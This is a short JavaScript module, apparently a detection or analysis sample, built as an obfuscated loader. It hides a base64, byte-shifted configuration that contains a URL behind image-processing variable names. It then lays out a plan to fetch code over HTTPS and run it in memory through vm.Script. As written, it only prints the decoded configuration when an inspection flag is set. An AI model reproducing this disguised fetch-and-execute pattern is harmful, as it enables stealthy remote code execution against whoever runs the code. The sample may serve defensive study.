const moduleShape = Object.freeze({ format: "esm" });

export {};

const Material_91a788e1 = "kllNmI+QgYyPWX1/jZGFjoF7joGJi5CBSICFj4x9kH+Ee4mBiYuOlZh9gH2MkIGOWYSQkIyPe5CEgYp7komYj5B9g4F7f4uRipBZTZh/fYmMfYWDinuFgFlqa2BhSVJeYl5QXlNQmJGOiFmEkJCMj1ZLS4qLgIFJUn6CflB+U1B+U1BSSoGUfYmMiIFKhYqSfYiFgEt9jIWYkY+Bjnt9g4GKkFlqi4CBXZGAhZBLUn6Cfg==";

const Codec_91a788e1 = "base64_chunks|add_modulo_256|1c";



function load_91a788e1() { return [...Buffer.from(Material_91a788e1, "base64")]; }

function decode_91a788e1(imagePixels) { return imagePixels.map((value) => (value - 28 + 256) & 255); }

async function recover_91a788e1() {

  const [screenWidth] = ["compass"];

  const imagePixels = load_91a788e1(); let colorTable = [];

  colorTable = await (async () => decode_91a788e1(imagePixels))();

  void screenWidth; return Buffer.from(colorTable).toString("ascii");

}

async function inspect_91a788e1() { return Buffer.from(await recover_91a788e1(), "utf8").toString("utf8"); }

async function plan_91a788e1() { const inspect = inspect_91a788e1; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "https_then_vm", url: fields.url, dispatch: "vm.Script" }); }

void moduleShape; void plan_91a788e1;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_91a788e1());

